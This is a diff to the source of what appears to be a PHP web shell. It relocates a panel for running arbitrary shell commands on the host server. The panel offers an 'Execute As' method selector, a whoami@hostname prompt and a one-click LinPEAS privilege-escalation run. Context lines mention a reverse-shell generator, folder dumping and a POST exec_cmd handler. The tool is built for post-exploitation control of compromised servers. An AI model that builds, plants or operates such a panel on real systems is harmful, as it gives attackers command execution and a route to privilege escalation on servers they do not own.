@@ -878,34 +878,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
     <div id="loading-overlay" style="display:none;">Dumping folder... (This will take a long time. Go make some coffee or take a shit...)</div>
     <a class="btn-red" style="position:absolute; right:10px; top:0; width: 100px; text-align:center" href="?logout=True">Log&nbsp;Out</a>
     <div class="grid">
-        <div  style="gap: 0px;align-items: stretch;" class="card span-row-4 flex-column">
-            <div class="card">
-                <div class="flex-row">
-                    <label for="cmdMethod">Execute&nbsp;As:</label>
-                    <select id="cmdMethod">
-                    <?php foreach ($available_ce_methods as $method){
-                        echo "<option value=" . htmlspecialchars($method) . ">" . htmlspecialchars($method) . "</option>";
-                    } ?>
-                    </select>
-                    <label for="cmdInputColors">
-                        ANSI&nbsp;Colors:
-                    </label>
-                    <input style="width: auto" type="checkbox" id="cmdInputColors" checked>
-                    <label>Quick&nbsp;Commands:</label>
-                    <button class="btn" onclick="executeShellCommand('./linpeas.sh > linpeas_out.txt 2>&1', true)">Run&nbsp;LinPEAS</button>
-                    <?php echo is_in_docker(); ?>
-                </div>
-            </div>
-            <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
-                <div class="flex-row" style="width: 100%">
-                    <label style="text-wrap:nowrap" for="cmdInput">
-                        <span style="color:#0f0"><?php echo execute_command('whoami', $available_ce_methods) ?><span style="color:white">@</span><?php echo execute_command('hostname', $available_ce_methods) ?></span>:<span style="color:#4d90fe" class="selectedPath">/</span>$
-                    </label>
-                    <input type="text" id="cmdInput" placeholder="Enter shell command">
-                </div>
-                <pre id="cmdOutput"></pre>
-            </div>
-        </div>
         <div class="card">
             <!-- Services, Auto Revshell Generator -->
             <div class="card">
@@ -938,6 +910,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                     }
                     ?>
                 </div>
+            </div>
+        </div>
+        <div  style="gap: 0px;align-items: stretch;" class="card span-row-4 flex-column">
+            <div class="card">
+                <div class="flex-row">
+                    <label for="cmdMethod">Execute&nbsp;As:</label>
+                    <select id="cmdMethod">
+                    <?php foreach ($available_ce_methods as $method){
+                        echo "<option value=" . htmlspecialchars($method) . ">" . htmlspecialchars($method) . "</option>";
+                    } ?>
+                    </select>
+                    <label for="cmdInputColors">
+                        ANSI&nbsp;Colors:
+                    </label>
+                    <input style="width: auto" type="checkbox" id="cmdInputColors" checked>
+                    <label>Quick&nbsp;Commands:</label>
+                    <button class="btn" onclick="executeShellCommand('./linpeas.sh > linpeas_out.txt 2>&1', true)">Run&nbsp;LinPEAS</button>
+                    <?php echo is_in_docker(); ?>
+                </div>
+            </div>
+            <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
+                <div class="flex-row" style="width: 100%">
+                    <label style="text-wrap:nowrap" for="cmdInput">
+                        <span style="color:#0f0"><?php echo execute_command('whoami', $available_ce_methods) ?><span style="color:white">@</span><?php echo execute_command('hostname', $available_ce_methods) ?></span>:<span style="color:#4d90fe" class="selectedPath">/</span>$
+                    </label>
+                    <input type="text" id="cmdInput" placeholder="Enter shell command">
+                </div>
+                <pre id="cmdOutput"></pre>
             </div>
         </div>
         <div id="file-tree-container" class="card span-row">
